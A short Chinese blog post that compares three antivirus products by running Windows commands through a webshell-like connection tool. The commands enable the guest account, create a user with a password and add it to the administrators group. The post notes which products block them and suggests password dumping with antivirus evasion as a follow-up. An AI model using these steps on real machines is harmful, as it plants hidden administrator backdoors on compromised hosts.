    大家好，很久没更新文章了，今天分享一个很有意思的测试。下了三款软件进行对比，看看我们安全软件对于一些危险动作敏感程度。


我们逐个进行测试 第一款

测试用net user 创建用户会提示弹窗。然后就没有然后吗？

不，我们可以试试开启guest用户来进行创建，命令如下

net user guest /active:yes

接下来试着添加到管理组

net localgroup administrators guest /add

开启成功 

成功登录



‍接下来测试下第二款

老规矩测试下创建用户

net user test Test123 /addnet localgroup administrators test/add

这款直接就不要说了连创建用户都不提示了，至于咋样大家心里应该知道了吧

这款就不测试了 到这已经GG了

测试下第三款

同样老规矩 我们试试添加用户，哦忘了说了 连接工具是类似菜刀，

net user 被拦截了 且默认阻止选项



net user guest /active:yes

我们在试试开启guest试试 一样开启弹窗 且阻止运行

    那么接下来就是只能是抓密码了，这里我就不演示了，做好免杀就可以达到效果了，用密码登录或者其他手段，这就看你们的了。
